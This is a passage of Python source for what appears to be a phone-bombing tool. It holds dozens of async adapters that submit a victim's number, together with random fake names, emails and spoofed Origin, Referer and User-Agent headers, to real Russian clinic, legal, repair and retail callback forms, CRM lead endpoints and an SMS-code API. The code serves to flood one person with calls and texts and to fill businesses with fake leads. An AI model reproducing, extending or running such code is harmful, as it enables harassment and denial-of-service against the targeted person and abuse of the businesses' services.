    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://ritual-36.ru","Referer":"https://ritual-36.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gos_cps_webforms(s, p):
    url = "https://gos-cps.ru/webforms/send_custom/"
    d = {"name":rn(),"phone":p["digits_7"],"form_name":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://gos-cps.ru","Referer":"https://gos-cps.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_csdent_ajaxform(s, p):
    url = "https://csdent.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://csdent.ru","Referer":"https://csdent.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_harizmadent(s, p):
    url = "https://harizmadent.ru/"
    d = {"name":rn(),"phone":p["digits_7"],"specialist":"Стоматолог"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://harizmadent.ru","Referer":"https://harizmadent.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomdent_api(s, p):
    url = "https://tomdent.ru/api/orderFormSend"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"service":"Стоматология"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://tomdent.ru","Referer":"https://tomdent.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stomatolog_vrn_bitrix(s, p):
    url = "https://stomatolog-vrn.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://stomatolog-vrn.bitrix24.ru","Referer":"https://stomatolog-vrn.bitrix24.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mcsevsiyanie_drupal(s, p):
    url = "https://mcsevsiyanie.ru/system/ajax?_format=drupal_ajax"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://mcsevsiyanie.ru","Referer":"https://mcsevsiyanie.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dentalcsp_cf7(s, p):
    url = "https://dentalcsp.ru/wp-json/contact-form-7/v1/contact-forms/2868/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись к стоматологу"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://dentalcsp.ru","Referer":"https://dentalcsp.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_28884(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/28884/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://dentalcsp.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://dentalcsp.ru","Referer":"https://dentalcsp.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_numedy_callfromsite(s, p):
    url = "https://exchange-external.numedy.com/api/v1/callfromsite/"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://numedy.com","Referer":"https://numedy.com/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dyn_crm_bitrix(s, p):
    url = "https://dyn-crm.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://dyn-crm.ru","Referer":"https://dyn-crm.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_artis_dental_cf7(s, p):
    url = "https://artis-dental.ru/wp-json/contact-form-7/v1/contact-forms/596/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись к стоматологу"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://artis-dental.ru","Referer":"https://artis-dental.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_54213(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/54213/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://artis-dental.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://artis-dental.ru","Referer":"https://artis-dental.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kristall62_ajax(s, p):
    url = "https://kristall62.ru/index.php?option=com_ajax&plugin=radicalform&group=system&format=json"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://kristall62.ru","Referer":"https://kristall62.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_medicom_plus_ajax(s, p):
    url = "https://medicom-plus.ru/bitrix/templates/med_mibok_s1/components/bitrix/main.include/record_form/ajax.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://medicom-plus.ru","Referer":"https://medicom-plus.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_schedule_mozdrav(s, p):
    url = "https://schedule.mozdrav.ru/sendCallController"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://schedule.mozdrav.ru","Referer":"https://schedule.mozdrav.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_avaclinic_ajax(s, p):
    url = "https://www.avaclinic.ru/local/templates/avaclinic/components/custom/forms/formCall/ajax.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://www.avaclinic.ru","Referer":"https://www.avaclinic.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pkfslovo_cf7(s, p):
    url = "https://pkfslovo.ru/wp-json/contact-form-7/v1/contact-forms/6049/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись на приём"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pkfslovo.ru","Referer":"https://pkfslovo.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_okna_trast(s, p):
    url = "https://www.okna-trast.ru/contacts/"
    d = {"name":rn(),"phone":p["formatted"],"message":"Заказ окон"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.okna-trast.ru","Referer":"https://www.okna-trast.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bg76_ajax(s, p):
    url = "https://bg76.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://bg76.ru","Referer":"https://bg76.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tmk24_bitrix(s, p):
    url = "https://tmk24.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://tmk24.bitrix24.ru","Referer":"https://tmk24.bitrix24.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_uyutnyeokna_spb(s, p):
    url = "https://uyutnyeokna-spb.ru/mod/project/733047/lead/send/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://uyutnyeokna-spb.ru","Referer":"https://uyutnyeokna-spb.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_yaroplast_balkony(s, p):
    url = "https://yaroplast.ru/balkony/osteklenie-balkonov/"
    d = {"name":rn(),"phone":p["formatted"],"comment":"Остекление балкона"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://yaroplast.ru","Referer":"https://yaroplast.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stroybalkon55_cf7(s, p):
    url = "https://stroybalkon55.ru/wp-json/contact-form-7/v1/contact-forms/6/feedback?_locale=user"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Остекление"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://stroybalkon55.ru","Referer":"https://stroybalkon55.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_as_clinic_ajax(s, p):
    url = "https://www.as.clinic/ajax/ajax.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback","message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://www.as.clinic","Referer":"https://www.as.clinic/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_syn_su_lander(s, p):
    url = "https://syn.su/lander.php?r=land/index&unit=synergy_marketplace&type=academy&land=ege-oge&version=ekspress-podgotovka-k-ege&noRedirect=false&lidforma=ege"
    d = {"name":rn(),"phone":p["formatted"],"email":re_(),"form_name":"ege"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://syn.su","Referer":"https://syn.su/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ege_study_ajax(s, p):
    url = "https://ege-study.ru/wp-admin/admin-ajax.php?action=send_mail&_wpnonce=af1f87b0dc"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Запись на курс"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://ege-study.ru","Referer":"https://ege-study.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dav_changanauto(s, p):
    url = "https://dav-changanauto.ru/ajax/form/send/"
    d = {"name":rn(),"phone":p["digits_7"],"brand":"Changan","model":random.choice(["CS35PLUS","CS55","UNI-K"])}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://dav-changanauto.ru","Referer":"https://dav-changanauto.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_fabulaspb_cf7(s, p):
    url = "https://fabulaspb.ru/wp-json/contact-form-7/v1/contact-forms/13331/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://fabulaspb.ru","Referer":"https://fabulaspb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kanna_prav(s, p):
    url = "https://kanna-prav.ru/uslugi/semejnyj-yurist-spb/yurist-po-brachnym-dogovoram/"
    d = {"name":rn(),"phone":p["digits_7"],"question":"Консультация юриста"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://kanna-prav.ru","Referer":"https://kanna-prav.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_zakonvspb(s, p):
    url = "https://zakonvspb.ru/tpl/ajax/mail-sender.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Нужна помощь юриста"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://zakonvspb.ru","Referer":"https://zakonvspb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_la_yurist_cf7(s, p):
    url = "https://la-yurist.ru/wp-json/contact-form-7/v1/contact-forms/3567/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://la-yurist.ru","Referer":"https://la-yurist.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_nekropol76(s, p):
    url = "https://nekropol76.ru/"
    d = {"name": rn(), "phone": p["formatted"], "message": "Изготовление памятника"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://nekropol76.ru", "Referer": "https://nekropol76.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_distancionnaya(s, p):
    url = "https://distancionnaya.ru/thankyou.php"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://distancionnaya.ru", "Referer": "https://distancionnaya.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sotkaonline_feedback(s, p):
    url = "https://admin.sotkaonline.ru/api/v1/feedback"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_(), "message": "Обратная связь"}
    h = {"User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://sotkaonline.ru", "Referer": "https://sotkaonline.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_100points_ajax(s, p):
    url = "https://100points.ru/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://100points.ru", "Referer": "https://100points.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_lsr_back(s, p):
    url = "https://spb.lsr.ru/oktyabrskaya-naberezhnaya/back/send/"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_(), "question": "Консультация по ЖК"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://spb.lsr.ru", "Referer": "https://spb.lsr.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_lsr(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode": "working_hours", "sessionId": random.randint(100000000, 999999999), "siteId": 31364, "phone": p["digits_7"], "name": rn()}
    h = {"User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://spb.lsr.ru", "Referer": "https://spb.lsr.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_59960(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/59960/requests/orders/register/"
    d = {"fio": rf(), "phoneNumber": p["raw"], "subject": "Заявка", "requestUrl": "https://nekropol76.ru/", "sessionId": str(random.randint(100000000, 999999999))}
    h = {"User-Agent": ua(), "Origin": "https://nekropol76.ru", "Referer": "https://nekropol76.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn_zhilkon_thanks(s, p):
    url = "https://xn----7sbabhdj3cdssg1cp3d.xn--p1ai/%D0%B6%D0%B8%D0%BB%D0%B8%D1%89%D0%BD%D0%B0%D1%8F-%D0%BA%D0%BE%D0%BD%D1%81%D1%83%D0%BB%D1%8C%D1%82%D0%B0%D1%86%D0%B8%D1%8F/thanks.php"
    d = {"name": rn(), "phone": p["formatted"], "question": "Жилищная консультация"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://xn----7sbabhdj3cdssg1cp3d.xn--p1ai", "Referer": "https://xn----7sbabhdj3cdssg1cp3d.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn_holodilniki_thanks(s, p):
    url = "https://xn----7sbhaiec5cyapefng4mwbc.xn--p1ai/holodilniki/thanks.php"
    d = {"name": rn(), "phone": p["digits_7"], "service": "Ремонт холодильников"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://xn----7sbhaiec5cyapefng4mwbc.xn--p1ai", "Referer": "https://xn----7sbhaiec5cyapefng4mwbc.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_nan_servis_addorders(s, p):
    url = "https://nan-servis.ru/addorders.php?idp=9a874e27-55c1-ceb5-d20625148a34b5d6"
    d = {"name": rn(), "phone": p["digits_7"], "service": "Ремонт техники", "address": ra()}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://nan-servis.ru", "Referer": "https://nan-servis.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn_mod_project_lead(s, p):
    url = "https://xn-----7kcjhcc1acawicfcneggdfbg0a8czeb3ftg.xn--p1ai/mod/project/820099/lead/send/"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    h = {"User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://xn-----7kcjhcc1acawicfcneggdfbg0a8czeb3ftg.xn--p1ai", "Referer": "https://xn-----7kcjhcc1acawicfcneggdfbg0a8czeb3ftg.xn--p1ai/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn76_cf7(s, p):
    url = "https://xn--76-vlcaue2e.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/215/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Заказ услуги"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://xn--76-vlcaue2e.xn--p1ai", "Referer": "https://xn--76-vlcaue2e.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_yaroslavl_gormaster_order(s, p):
    url = "https://yaroslavl.gor-master.ru/order/create"
    d = {"name": rn(), "phone": p["digits_7"], "service": random.choice(SERV), "address": ra()}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://yaroslavl.gor-master.ru", "Referer": "https://yaroslavl.gor-master.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_nan_center_tv(s, p):
    url = "https://nan-center.ru/televizory/addorders.php?idp=9a874e27-55c1-ceb5-d20625148a34b5d6"
    d = {"name": rn(), "phone": p["digits_7"], "service": "Ремонт телевизоров"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://nan-center.ru", "Referer": "https://nan-center.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_zr_remont_tv_lead(s, p):
    url = "https://zr-remont-tv.ru/api/v1/lead.add"
    d = {"name": rn(), "phone": p["digits_7"], "service": "Ремонт телевизоров"}
    h = {"User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://zr-remont-tv.ru", "Referer": "https://zr-remont-tv.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_komp_proffmasters_send(s, p):
    url = "https://komp.proffmasters.ru/send.php"
    d = {"name": rn(), "phone": p["digits_7"], "service": "Компьютерная помощь"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://komp.proffmasters.ru", "Referer": "https://komp.proffmasters.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn80aalenkmkh_cf7(s, p):
    url = "https://xn--80aalenkmkh.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/136/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Консультация"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://xn--80aalenkmkh.xn--p1ai", "Referer": "https://xn--80aalenkmkh.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_zastroyshiki_bitrix(s, p):
    url = "https://zastroyshiki.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields": {"NAME": rn(), "PHONE": [{"VALUE": p["digits_7"]}]}}
    h = {"User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://zastroyshiki.bitrix24.ru", "Referer": "https://zastroyshiki.bitrix24.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_silk_api_callback(s, p):
    url = "https://silk.ru/api/callback/add"
    d = {"name": rn(), "phone": p["digits_7"]}
    h = {"User-Agent": ua(), "Content-Type": "application/json", "Origin": "https://silk.ru", "Referer": "https://silk.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_whsteel_app(s, p):
    url = "https://whsteel.ru/app/c"
    d = {"name": rn(), "phone": p["digits_7"], "service": "Металлоконструкции"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://whsteel.ru", "Referer": "https://whsteel.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_parquet_pro(s, p):
    url = "https://parquet-pro.ru/"
    d = {"name": rn(), "phone": p["formatted"], "message": "Укладка паркета"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://parquet-pro.ru", "Referer": "https://parquet-pro.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_master_bobr_sendit(s, p):
    url = "https://spb.master-bobr.ru/assets/components/sendit/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone": p["raw"], "name": rn(), "form_key": fk, "agree": "on"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://spb.master-bobr.ru", "Referer": "https://spb.master-bobr.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_bekker_peregorodki_ajax(s, p):
    url = "https://spb.bekker-peregorodki.ru/local/ajax/forms/"
    d = {"name": rn(), "phone": p["digits_7"], "form_id": "callback"}
    h = {"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://spb.bekker-peregorodki.ru", "Referer": "https://spb.bekker-peregorodki.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_72895(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/72895/register/"
    d = {"fio": rf(), "phoneNumber": p["raw"], "subject": "Заявка", "requestUrl": "https://parquet-pro.ru/", "sessionId": str(random.randint(100000000, 999999999))}
    h = {"User-Agent": ua(), "Origin": "https://parquet-pro.ru", "Referer": "https://parquet-pro.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

# ==================== НОВЫЕ АДАПТЕРЫ ИЗ APL9.TXT ====================
async def send_omsk_stretching(s, p):
    url = "https://omsk-stretching.xn-----flcgbcebt2afu7clzd5f4f.xn--p1ai/mod/project/824121/lead/send/"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_lenremont_new(s, p):
    url = "https://www.lenremont.ru/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_profishelp(s, p):
    url = "https://profishelp.ru/app/c"
    d = {"name": rn(), "phone": p["digits_7"], "service": random.choice(SERV)}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_rosstroy76_new(s, p):
    url = "https://www.rosstroy76.ru/call/"
    d = {"name": rn(), "phone": p["formatted"], "time": "Сейчас"}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15, allow_redirects=False) as r: return r.status, await r.text()

async def send_marquiz(s, p):
    url = "https://api.marquiz.ru/v1/answers"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_okna_wooden(s, p):
    url = "https://okna-wooden.ru/mod/project/821147/lead/send/"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_santehnika1(s, p):
    url = "https://santehnika1.ru/ajax/call.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_santehnika_room(s, p):
    url = "https://www.santehnika-room.ru/ajax/form"
    d = {"name": rn(), "phone": p["formatted"]}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_santehmoll(s, p):
    url = "https://santehmoll.ru/ajax/createCallback/"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_vosantehnik(s, p):
    url = "https://vosantehnik.ru/order"
    d = {"name": rn(), "phone": p["formatted"], "message": "Нужен сантехник"}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_ruki_iz_plech(s, p):
    url = "https://cpa.ruki-iz-plech.ru/api/leads/create"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_(), "comment": random.choice(SERV)}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_supermarket_santehniki(s, p):
    url = "https://www.supermarket-santehniki.ru/bitrix/templates/santeh/ajax/form_result_new.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_callibri_new(s, p):
    url = "https://in.callibri.ru/module/callibri_callback"
    d = {"phone": p["digits_7"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_lbspace(s, p):
    url = "https://lbspace.ru/wp-json/contact-form-7/v1/contact-forms/318/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Консультация"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_xn_7sbbspmsb6am8a(s, p):
    url = "https://xn----7sbbspmsb6am8a.xn--p1ai/ajax/form.php"
    params = {"form_id": "CALLBACK"}
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, params=params, data=d, headers={"User-Agent": ua()}, timeout=15, allow_redirects=False) as r: return r.status, await r.text()

async def send_home_heat(s, p):
    url = "https://sms-api.home-heat.ru/send-code"
    d = {"phone": p["digits_7"]}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_remont_electrici(s, p):
    url = "https://remont-electrici.ru/ajax.php"
    d = {"name": rn(), "phone": p["digits_7"], "service": "Электрик"}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_techemenergy(s, p):
    url = "https://techemenergy.ru/sender"
    d = {"phone": p["digits_7"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_mos_elektrika(s, p):
    url = "https://www.mos-elektrika.ru/wp-content/themes/me_theme/send.php"
    d = {"name": rn(), "phone": p["formatted"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_uslugi_elektrika(s, p):
    url = "https://uslugi-elektrika-i-santehnika.ru/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_220toka(s, p):
    url = "https://220toka.ru/wp-admin/admin-ajax.php"
